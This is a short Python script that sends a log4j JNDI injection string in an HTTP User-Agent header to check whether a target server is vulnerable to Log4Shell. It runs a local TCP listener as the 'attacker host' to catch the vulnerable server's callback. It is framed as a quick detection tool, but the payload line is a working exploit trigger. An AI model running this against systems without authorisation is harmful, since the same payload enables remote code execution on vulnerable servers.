#! /usr/bin/env python3

'''
    Needs Requests (pip3 install requests)

    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: DWTFUWANTWTL (Do What Ever the Fuck You Want With This License)

    
    This should allow you to detect if something is potentially exploitable to the log4j 0day dropped on December 9th 2021.
     
    WARNING: This script is extremely naive in a lot of ways cause it was put together in 15 min. See comments below.

    References:
        - https://www.lunasec.io/docs/blog/log4j-zero-day/
        - https://github.com/tangxiaofeng7/apache-log4j-poc
        - https://github.com/apache/logging-log4j2/pull/608
'''

import logging
import requests
import socket
import argparse
import threading
import time

handler = logging.StreamHandler()
handler.setFormatter(
    logging.Formatter(
        style="{",
        fmt="[{name}:{filename}] {levelname} - {message}"
    )
)

log = logging.getLogger("log4jscanner")
log.setLevel(logging.DEBUG)
log.addHandler(handler)

def tcp_server(attacker_host):
    _, PORT = attacker_host.split(':')
    HOST = ''
    PORT = int(PORT)

    log.debug(f"Starting server on 0.0.0.0:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            log.debug(f"Connected by {addr}. If this is the same host you attacked its most likely vulnerable")
            while True:
                data = conn.recv(1024)
                if not data: break
                print(data.hex())

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='target http url')
    parser.add_argument('--attacker-host', type=str, dest='attacker_host', default='127.0.0.1:1389', help="attacker's host:port ")
    parser.add_argument('--timeout', type=int, dest='timeout', default=10, help='timeout to start listening')

    args = parser.parse_args()
    print(args)

    server_thread = threading.Thread(target=tcp_server, args=(args.attacker_host,))
    server_thread.setDaemon(True)
    server_thread.start()

    time.sleep(2)

    try:
        """
        Due of the nature of the exploit, any HTTP field could be used to exploit a vulnerable machine (as long as it's being logged on the affected host)
        Here we're just injecting the string in the User-Agent field.
        """

        requests.get(
            args.url,
            headers={'User-Agent': f'${{jndi:ldap://{args.attacker_host}/exploit.class}}'},
            verify=False
        )
    except requests.exceptions.ConnectionError as e:
        log.error(f"HTTP connection to target URL error: {e}")

    log.debug(f"Waiting {args.timeout} seconds for a response")
    time.sleep(args.timeout)

if __name__ == "__main__":
    main()
